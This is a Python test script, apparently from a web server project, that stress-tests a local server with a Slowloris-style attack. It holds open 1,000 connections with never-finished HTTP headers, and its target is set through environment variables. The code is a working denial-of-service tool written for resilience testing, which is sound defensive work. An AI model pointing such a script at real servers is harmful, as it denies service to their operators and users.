# test/http/test_slow_lors.py

import socket
import threading
import time
import os
import sys

HOST = os.getenv("WEBSERV_HOST", "127.0.0.1")
PORT = int(os.getenv("WEBSERV_PORT", "8080"))
CONNECTIONS = 1000
DELAY = 10  # seconds between header chunks

HEADERS = [
    "GET / HTTP/1.1\r\n",
    "Host: localhost\r\n",
    "User-Agent: slowloris-test\r\n",
    "Accept: */*\r\n"
]

def slow_client(index, results):
    try:
        s = socket.create_connection((HOST, PORT))
        s.settimeout(DELAY + 2)

        # Send request line and first headers slowly
        for h in HEADERS:
            s.sendall(h.encode())
            time.sleep(DELAY)

        # Never send the final \r\n to end headers
        while True:
            s.sendall(b"X-a: b\r\n")
            time.sleep(DELAY)
    except Exception as e:
        results[index] = f"❌ Slow client {index} → {type(e).__name__}: {e}"
        return
    results[index] = f"✅ Slow client {index} held socket open"


def run_slow_lors_test():
    print("[SLOW] Running slow_lors attack test...")

    results = [None] * CONNECTIONS
    threads = []

    for i in range(CONNECTIONS):
        t = threading.Thread(target=slow_client, args=(i, results))
        threads.append(t)
        t.start()

    time.sleep(10)  # Wait to see if server handles all connections

    alive = sum(1 for r in results if r is None or r.startswith("✅"))
    for r in results:
        if r:
            print(r)

    if alive >= CONNECTIONS // 2:
        print(f"✅ {alive}/{CONNECTIONS} connections still alive → Webserv is resilient")
    else:
        print(f"❌ Only {alive}/{CONNECTIONS} survived → server likely crashed or dropped connections")
        sys.exit(1)

    # Clean exit
    print("[SLOW] Killing slow clients")
    os._exit(0)  # kill all threads

if __name__ == "__main__":
    run_slow_lors_test()
